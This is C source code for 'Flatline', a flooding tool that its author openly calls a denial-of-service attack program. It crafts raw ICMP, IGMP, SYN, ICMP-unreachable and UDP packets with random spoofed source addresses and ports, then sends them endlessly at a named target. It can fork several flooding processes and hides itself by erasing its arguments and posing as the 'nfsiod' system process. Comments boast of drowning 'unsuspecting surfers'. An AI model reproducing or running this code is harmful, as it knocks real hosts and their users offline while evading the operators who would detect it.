// DISTRIBUTION 4 NOTES :
//
// The private distribution of flatline #4 has been severly optimized by 
// removing excess function calls and reducing the number of calculations 
// and assignments drastically.  The performance gain is yet to be determined, 
// but I am hoping for an increase from about 12,000 packets per second to
// nearly 30,000.

//   This would fulfill the secondary design requirement - that a maximum 
// throughput be achieved for the minimal system (Soulblazer's) - 
// a Pentium 90 with 48 megs of RAM and a 33.6 kbps modem.

//   Flatline is rapidly aproaching it's design completion and is the most 
// formidable DOS attack program of this time.  Research will continue
// however, as Soulblazer dreams up more and more madness.

// There is a storm brewing...

// Silicate 


/****************************   INCLUDES  ******************************/


#include <unistd.h>               // Symbolic Constants.
#include <stdlib.h>               // Utility Functions.
#include <string.h>               // String Operations.
#include <netdb.h>                // Used for Hosts Lookup.
#include <stdio.h>                // Standard I/O Library.
#include <sys/types.h>            // Primitive System Data Types.
#include <sys/socket.h>           // RAW Socket Library.
#include <netinet/in.h>           // ??
#include <netinet/in_systm.h>     // ??
#include <netinet/ip.h>           // Internet Protocol Library.
#include <arpa/inet.h>            // Internet stuff.
#include <signal.h>               // Signal Handling Library.
#ifndef __USE_BSD
#define __USE_BSD
#endif
#define __FAVOR_BSD
#include <netinet/udp.h>       // UDP Structure Library.
#include <netinet/tcp.h>       // TCP Structure Library.
#include <netinet/ip_icmp.h>      // ICMP Structure Library.
#include <netinet/igmp.h>         // IGMP Structure Library.
#include <pwd.h>                  // ******** File.
#include <time.h>                 // Time & Date Manipulation Library.


/****************************   DEFINES  ******************************/


#define Port_Max 65534             // Highest Addressable Port.
#define Packet_Max 1023            // Largest Packet Size.
#define Default_Fork 0             // Don't fork by default.
#define Default_Stealth "(nfsiod)" // Make me look like the nfsiod program.
#ifndef TRUE
#define TRUE    1
#define FALSE   0
#endif

/* Color Pallete ('Cause pretty makes it better) */
#define B  "\033[1;30m"           // Blue.
#define R  "\033[1;31m"           // Red.
#define G  "\033[1;32m"           // Green.
#define Y  "\033[1;33m"           // Yellow.
#define U  "\033[1;34m"           // Uh, I don't know.
#define M  "\033[1;35m"           // Magenta.
#define C  "\033[1;36m"           // Cyan.
#define W  "\033[1;37m"           // White.
#define DR "\033[0;31m"           // Dark Red.
#define DG "\033[0;32m"           // Dark Green.
#define DY "\033[0;33m"           // Dark Yellow (Otherwise known as Brown).
#define DU "\033[0;34m"           // Dark Uh, I don't know.
#define DM "\033[0;35m"           // Dark Magenta.
#define DC "\033[0;36m"           // Dark Cyan.
#define DW "\033[0;37m"           // Dark White (Otherwise known as Gray).
#define RESTORE "\33[0;0m"        // RESTORE crap!
#define CLEAR "\033[0;0H\033[J"   // Clear the terminal view.


/*********************  VARIABLE DECLARATIONS  *******************/

// The destination address...
struct sockaddr_in dstaddr;

// The packet destination (htonl)
unsigned long dst;

// Packet Definitions and Structures
// ICMP PACKET...
char   *ICMP_Packet;
struct ip      *ICMP_IP_HDR;
struct icmphdr *ICMP_HDR;
int    ICMP_Size;

// IGMP PACKET...
char   *IGMP_Packet;
struct ip      *IGMP_IP_HDR;
struct igmphdr *IGMP_HDR;
int    IGMP_Size;

// UNREACH PACKET...
char   *UNREACH_Packet;
struct ip      *UNREACH_IP_HDR;
struct icmphdr *UNREACH_ICMP_HDR;
int    UNREACH_Size;

// UDP PACKET...
char           *UDP_Packet;
struct ip      *UDP_IP_HDR;
struct udphdr  *UDP_HDR;
int            UDP_Size;

// SYN PACKET...
char          *SYN_Packet;
struct ip     *SYN_IP_HDR;
struct tcphdr *SYN_TCP_HDR;
int           SYN_Size;

// Miscellaneous Variables...
char *target;
char *stealth;

int  opensock;              // Socket to send through.
int  unlim         =  0;    // Default unlimited is OFF.
int  dstport       =  0;    // Destination Port.
int  srcport       =  0;    // Source Port.
int  numpacks      =  0;    // Number of Packets to be delivered.
int  burst         =  0;    // I think this is a usleep value (Why go slower?)
int  forknum       =  0;    // Number of times to fork off...
int  eminsize      =  9;    // Minimum size of the letter 'e'.
int  uminsize      = 56;    // Minimum size of the letter 'u'.
int  burstmode     = FALSE; // Something that Soulblazer dreamed up.

int  etype[10]     = {0, 4, 8, 12, 13, 14, 15, 16, 17, 18};
int  ucode[16]     = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/**************************  FUNCTION PROTOTYPES  ***************************/

void banner (void);
// This function displays program information for those without the
// source for Flatline. LOSERS need not apply...
//
// This function calls no functions.
// This function is called by MAIN.

void usage (char *pname);
// This function displays program usage if the user has entered
// insufficient or invalid command-line options.
// 
// This function calls no functions.
// This function is called by Parse_Args and MAIN.
 
void resolvedest (void);
// This function resolves the Host name for the target system.
//
// This function calls no functions.
// This function is called by MAIN.

void parse_args (int argc, char *argv[]);
// This functions handles command-line parsing.
//
// This function calls Usage.
// This function is called by MAIN.

void cloaking (int argc, char *argv[]);
// This function allows Flatline to cloak itself by using the name of
// a program that runs on most computers. 
//
// This function calls no functions.
// This function is called by MAIN.


/**************************  FUNCTION DEFINITIONS  **************************/


void banner () {
  printf ("%s%sWe Kick Ass...", CLEAR, Y);
} /* End Banner */

void usage (char *pname) { 
  printf ("%s%sUSAGE : %s%s > You messed it up!\n", CLEAR, M, B, pname);
  exit(EXIT_SUCCESS); 
} /* End Usage */

void resolvedest(void) {
  struct hostent *host;

  memset(&dstaddr, 0, sizeof(struct sockaddr_in));
  dstaddr.sin_family = AF_INET;
  dstaddr.sin_addr.s_addr = inet_addr(target);

  if (dstaddr.sin_addr.s_addr == -1) {
          host = gethostbyname(target);
          if (host == NULL) {
            printf("[*] Unable To resolve %s\t\n", target);
      exit(EXIT_FAILURE);
          } /* End If */
          dstaddr.sin_family = host->h_addrtype;
          memcpy((caddr_t) & dstaddr.sin_addr, host->h_addr, host->h_length);
  } /* End If */
  memcpy(&dst, (char *) &dstaddr.sin_addr.s_addr, 4);
} /* End ResolveDest */

void parse_args(int argc, char *argv[]) {
  int opt;

  while ((opt = getopt(argc, argv, "x:n:f:")) != -1)
    switch (opt) {
      case 'x':
        stealth = (char *) malloc(strlen(optarg));
        strcpy(stealth, optarg);
        break;
      case 'n':
        numpacks = atoi(optarg);
        break;
      case 'f':
        forknum = atoi(optarg);
        break;
      default:
        usage(argv[0]);
    } /* End Switch */

    // What do we look like?
    if (!stealth)
       stealth = Default_Stealth;

    // How many times do you want me to fork?
    if (!forknum)
       forknum = Default_Fork;

    // Do we have a Packet Destination?
    // NO.
    if (!argv[optind]) {
            printf("\n\n%s[%s*%s]%s We need a Place for the Packets to Go%s\n",DC,W,DC,DR,RESTORE);
            exit(EXIT_FAILURE);
    }/* End If */

    // YES.
    target = (char *) malloc(strlen(argv[optind]));

   // Did we have memory to copy the target address? (I sure as hell hope so!)
    if (!target) {
            printf("\n\n%s[%s*%s]%s Unable to Allocate Required Amount of Memory for Task%s\n",DC,W,DC,DR,RESTORE);
      perror("malloc");
            exit(EXIT_FAILURE);
    } /* End If */

    // Copy the target address...
    strcpy(target, argv[optind]);
} /* End Parse_Args */

void cloaking(int argc, char *argv[]) {
  register Index;
  // Replace arguments with zeros...
  for (Index = argc-1; Index >= 0; Index--)
    memset(argv[Index], 0, strlen(argv[Index]));
  // Replace the process name with a common name...
  strcpy(argv[0], stealth);
} /* End Cloaking */


int Setup_Packets (void) {
  // Create & Set the ICMP Packet...
  ICMP_Size        = sizeof (struct ip) + sizeof(struct icmphdr);
  ICMP_Packet      = (char *) malloc(ICMP_Size);
  ICMP_IP_HDR      = (struct ip *) ICMP_Packet;
  ICMP_HDR         = (struct icmphdr *) (ICMP_Packet + sizeof(struct ip));
  memset (ICMP_Packet, 0, ICMP_Size);

  // Create & Set the UDP Packet...
  UDP_Size         = sizeof(struct ip) + sizeof(struct udphdr);
  UDP_Packet       = (char *) malloc(UDP_Size);
  UDP_IP_HDR       = (struct ip *) UDP_Packet;
  UDP_HDR          = (struct udphdr *) (UDP_Packet + sizeof(struct ip));
  memset (UDP_Packet, 0, UDP_Size);

  // Create & Set the IGMP Packet...
  IGMP_Size        = sizeof(struct ip) + sizeof(struct igmphdr);
  IGMP_Packet      = (char *) malloc(IGMP_Size);
  IGMP_IP_HDR      = (struct ip *) IGMP_Packet;
  IGMP_HDR         = (struct igmphdr *) (IGMP_Packet + sizeof(struct ip));
  memset (IGMP_Packet, 0, IGMP_Size);

  // Create & Set the UNREACH Packet...
  UNREACH_Size     = sizeof(struct ip) + sizeof(struct icmphdr);
  UNREACH_Packet   = (char *) malloc(UNREACH_Size);
  UNREACH_IP_HDR   = (struct ip *) UNREACH_Packet;
  UNREACH_ICMP_HDR = (struct icmphdr *) (UNREACH_Packet + sizeof(struct ip));
  memset (UNREACH_Packet, 0, UNREACH_Size);

  // Create & Set the SYN Packet...
  SYN_Size    = sizeof(struct ip) + sizeof(struct tcphdr);
  SYN_Packet  = (char *) malloc(SYN_Size);
  SYN_IP_HDR  = (struct ip *) SYN_Packet;
  SYN_TCP_HDR = (struct tcphdr *) (SYN_Packet + sizeof(struct ip));
  memset (SYN_Packet, 0, SYN_Size);

  // Stick in some static values for =>
  // ICMP :
  ICMP_IP_HDR->ip_dst.s_addr    = dst;              // Destination IP Address.
  ICMP_IP_HDR->ip_v             = 4;                // IP Version Number.
  ICMP_IP_HDR->ip_off           = htons(0x2000);    // Ask Soulblazer.
  ICMP_IP_HDR->ip_hl            = 5;                // Ditto.
  ICMP_IP_HDR->ip_ttl           = 255;              // Time to Live.
  ICMP_IP_HDR->ip_p             = IPPROTO_ICMP;     // IP Protocol.
  ICMP_IP_HDR->ip_tos           = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)
  ICMP_IP_HDR->ip_len           = htons(ICMP_Size); // Length of the IP header.
  ICMP_IP_HDR->ip_sum           = 0;                // Force Kernel Checksum?

  ICMP_HDR->code                = 0;                // Ask Soulblazer.
  ICMP_HDR->checksum            = htons(ICMP_Size + eminsize);

  // SYN :
  SYN_IP_HDR->ip_dst.s_addr     = dst;              // Destination IP Address.
  SYN_IP_HDR->ip_v              = 4;                // IP Version Number.
  SYN_IP_HDR->ip_off            = htons(0x2000);    // Ask Soulblazer.
  SYN_IP_HDR->ip_hl             = 5;                // Ditto.
  SYN_IP_HDR->ip_ttl            = 255;              // Time to Live.
  SYN_IP_HDR->ip_p              = IPPROTO_TCP;      // IP Protocol.
  SYN_IP_HDR->ip_tos            = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)
  SYN_IP_HDR->ip_len            = htons(SYN_Size);  // Length of the IP header.
  SYN_IP_HDR->ip_sum            = 0;                // Force Kernel Checksum?

  SYN_TCP_HDR->th_flags         = TH_SYN;
  SYN_TCP_HDR->th_win           = htons(65535);
  SYN_TCP_HDR->th_sum           = htons(SYN_Size);

  // IGMP :
  IGMP_IP_HDR->ip_dst.s_addr    = dst;              // Destination IP Address.
  IGMP_IP_HDR->ip_v             = 4;                // IP Version Number.
  IGMP_IP_HDR->ip_off           = htons(0x2000);    // Ask Soulblazer.
  IGMP_IP_HDR->ip_hl            = 5;                // Ditto.
  IGMP_IP_HDR->ip_ttl           = 255;              // Time to Live.
  IGMP_IP_HDR->ip_p             = IPPROTO_IGMP;     // IP Protocol.
  IGMP_IP_HDR->ip_tos           = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)
  IGMP_IP_HDR->ip_len           = htons(IGMP_Size); // Length of the IP header.
  IGMP_IP_HDR->ip_sum           = 0;                // Force Kernel Checksum?

  IGMP_HDR->type                = 17;
  IGMP_HDR->code                = 0;
  IGMP_HDR->csum                = htons(IGMP_Size);

  // UNREACH :
  UNREACH_IP_HDR->ip_dst.s_addr = dst;                 // Destination IP Address.
  UNREACH_IP_HDR->ip_v          = 4;                   // IP Version Number.
  UNREACH_IP_HDR->ip_off        = htons(0x2000);       // Ask Soulblazer.
  UNREACH_IP_HDR->ip_hl         = 5;                   // Ditto.
  UNREACH_IP_HDR->ip_ttl        = 255;                 // Time to Live.
  UNREACH_IP_HDR->ip_p          = IPPROTO_ICMP;        // IP Protocol.
  UNREACH_IP_HDR->ip_tos        = htons(0xe0);         // Type of Service. (I wonder what service 0x45 is.)
  UNREACH_IP_HDR->ip_len        = htons(UNREACH_Size); // Length of the IP header.
  UNREACH_IP_HDR->ip_sum        = 0;                   // Force Kernel Checksum?

  UNREACH_ICMP_HDR->type        = 3;
  UNREACH_ICMP_HDR->checksum    = htons(UNREACH_Size + uminsize);

  // UDP :
  UDP_IP_HDR->ip_dst.s_addr     = dst;                 // Destination IP Address.
  UDP_IP_HDR->ip_v              = 4;                   // IP Version Number.
  UDP_IP_HDR->ip_off            = htons(0x2000);       // Ask Soulblazer.
  UDP_IP_HDR->ip_hl             = 5;                   // Ditto.
  UDP_IP_HDR->ip_ttl            = 255;                 // Time to Live.
  UDP_IP_HDR->ip_p              = IPPROTO_UDP;         // IP Protocol.
  UDP_IP_HDR->ip_tos            = htons(0xe0);         // Type of Service. (I wonder what service 0x45 is.)
  UDP_IP_HDR->ip_len            = htons(UDP_Size);     // Length of the IP header.
  UDP_IP_HDR->ip_sum            = 0;                   // Force Kernel Checksum?

  UDP_HDR->uh_ulen               = htons(sizeof(struct udphdr));
return(0);
} /* End Setup_Packets */


/**************************  FLATLINE < MAIN >  **************************/


void main(int argc, char *argv[]) {
  register ForkCount; // Used as FOR control of # times forked.
  register PackCount; // Used as FOR control of # packets sent.
  register unlim = 0; // Required for Unlimited packet count.

  if ((opensock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("socket");
    exit(1);
  } /* End If */

  setgid(getgid());
  setuid(getuid());

  if (argc < 2)
    usage(argv[0]);

  parse_args(argc, argv);

  cloaking(argc, argv);
    
  resolvedest();

  // Do we want to fork? I know I sure as hell don't!
  if (forknum) {
    // See if we can we fork?
    switch(fork()) {
      // Failure to comply...
      case -1:
        printf("%s  [%s*%s]%s Your OS cant Make the fork() call as we need it%s",DC,W,DC,DR,RESTORE);
        printf("%s  [%s*%s]%s This is usually an indication of something bad%s",DC,W,DC,DR,RESTORE);
        exit(1);
      // Um, I'm not sure what happened so let's skip any more fork stuff...
      case 0:
        break;
      // Why have one when you can have one when you can have two for twice 
      // the price?
      default:
        forknum--;
        // Fork Off...
       for(ForkCount = 0; ForkCount < forknum; ForkCount++){
         switch(fork()){
           case -1:
             printf("%s  [%s*%s]%s Unable to fork%s\n",DC,W,DC,DR,RESTORE);
             printf("%s  [%s*%s]%s This is usually an indication of something bad%s",DC,W,DC,DR,RESTORE);
              exit(1);
           case 0:
             ForkCount = forknum;
             break;
           default:
             if(ForkCount == forknum-1){
               printf("%s  [%s*%s]%s  Process Backgrounded%s\n",DC,W,DC,DR,RESTORE);
               exit(0);
             } /* End If */
         } /* End Switch */
       } /* End For */
     } /* End Switch */
   } /* End If */

  // Do you want me to run forever?
  if (!numpacks) {
   unlim++;
   numpacks++;
  } /* End If */

  // Set up the parts of the packets that do not change...
  Setup_Packets();

  // Say Hello...
  banner();

  // NOTES on the FOR statement implementation :
  // If Unlimited is TRUE, decrement the packet count then increment it (0 Change PackCount < numpacks).
  // If Unlimited id FALSE, increment the packet count then increment it again.
  // I didn't write this part but doesn't it send half of the number of packets if you specify a
  // numpacks value?  The last increment should be removed, so that if !unlim then PackCount would
  // decrement continually.

  // Oh well, so much for philosophy let's reach out and drown some unsuspecting surfers...
  for (PackCount = 0; PackCount < numpacks; (unlim) ? PackCount++, PackCount-- : PackCount++) {
    // Volatile Values for ICMP Packet...
    ICMP_IP_HDR->ip_src.s_addr = htonl(rand());
    ICMP_IP_HDR->ip_id         = rand();

    ICMP_HDR->type             = etype[rand()%10];
    // Take that...
    sendto(opensock, ICMP_Packet, ICMP_Size + eminsize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));

    // Volatile Values for IGMP Packet...
    IGMP_IP_HDR->ip_src.s_addr = htonl(rand());
    IGMP_IP_HDR->ip_id         = rand();

    IGMP_HDR->group            = htonl(rand());
    IGMP_HDR->csum             = htons(sizeof(struct ip) + sizeof(struct igmphdr));
    // And this...
    sendto(opensock, IGMP_Packet, IGMP_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));

    // Volatile Values for SYN Packet...
    SYN_IP_HDR->ip_src.s_addr = htonl(rand());
    SYN_IP_HDR->ip_id         = rand();

    SYN_TCP_HDR->th_seq       = rand();
    SYN_TCP_HDR->th_ack       = rand();
    SYN_TCP_HDR->th_dport     = htons(rand()% Port_Max + 1);
    SYN_TCP_HDR->th_sport     = htons(rand()% Port_Max + 1);
    // and one of these...
    sendto(opensock, SYN_Packet, SYN_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));

    // Volatile Values for UNREACH Packet...
    UNREACH_IP_HDR->ip_src.s_addr = htonl(rand());
    UNREACH_IP_HDR->ip_id         = rand();

    ICMP_HDR->code                = ucode[rand()%16];
    // and some of this...
    sendto(opensock, UNREACH_Packet, UNREACH_Size + uminsize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));

    // Volatile Values for UDP Packet...
    UDP_IP_HDR->ip_src.s_addr = htonl(rand());
    UDP_IP_HDR->ip_id         = rand();

    UDP_HDR->uh_sport           = htons(rand()% Port_Max + 1);
    UDP_HDR->uh_dport           = htons(rand()% Port_Max + 1);
    // Do not mess in the affairs of wizards, for you are crunchy and good with ketchup...
    sendto(opensock, UDP_Packet, UDP_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));
  } /* End For */
} /* End MAIN */

/* EOF < FLATLINE > */